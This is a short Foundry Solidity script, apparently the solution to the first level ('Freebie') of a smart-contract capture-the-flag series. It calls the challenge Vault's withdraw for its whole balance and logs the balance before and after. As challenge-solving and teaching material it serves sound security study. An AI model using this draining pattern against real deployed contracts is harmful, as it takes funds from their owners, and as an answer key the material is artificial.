// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../../src/01_Freebie/Vault.sol";

contract Solver is Script {

    address vaultAddress = vm.envAddress("CONTRACT");
    uint256 owner = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(owner);
        Vault vault = Vault(vaultAddress);
        console.log(address(vault).balance);
        vault.withdraw(address(vault).balance);
        console.log(address(vault).balance);
        vm.stopBroadcast();
    }
}
